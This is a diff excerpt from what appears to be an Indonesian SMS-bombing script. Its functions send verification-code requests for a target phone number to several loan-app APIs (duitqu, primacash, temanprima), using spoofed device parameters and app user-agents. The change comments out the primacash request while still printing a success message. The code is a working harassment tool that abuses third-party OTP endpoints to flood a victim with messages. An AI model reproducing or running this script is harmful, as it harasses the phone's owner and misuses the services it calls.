@@ -252,11 +252,11 @@ def duitqu():
  tes = requests.get("https://appapi.duitqu.id/api/v1/custom/send_verify_code?mobile=62%s&af_id=1603327368446-6560442845592783226&app=duitqu&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-4675-9452-e0d8565c9a50&instance_id=ccvIIClr0Sw&is_root=0&l=in&m=vivo+1902&os=android&r=9&sdk=28&simulator=0&t=1432349188&v=10102&sign=1B8BE88D093027E0CD9970C48DCA3F86EDE31C08"%nom)
  sukses("24","sms","duiqu")
 def primacash():
- uhu = requests.post("https://db.ksppus.co.id/indonesia_loan/user/get_validate_code",headers={'user-agent':'okhttp/3.14.4'},data=json.dumps({'phone':'62'+nom})).text
- if json.loads(uhu)["success"] == True:
+# uhu = requests.post("https://db.ksppus.co.id/indonesia_loan/user/get_validate_code",headers={'user-agent':'okhttp/3.14.4'},data=json.dumps({'phone':'62'+nom})).text
+# if json.loads(uhu)["success"] == True:
   sukses("25","sms","primacash")
- else:
-  gagal("26","sms","primacash")
+ #else:
+  #gagal("26","sms","primacash")
 def temanprima():
  dat=json.dumps({"phone":"62"+nom,"place":"google","phone_brand":"vivo","phone_model":"vivo 1902","device_id":"590bc36d99d6dddb"})
  hpo = requests.post("https://pro.temanprima.co.id/teman_prima/user/get_validate_code",headers={'user-agent':'okhttp/3.14.4'},data=dat).text
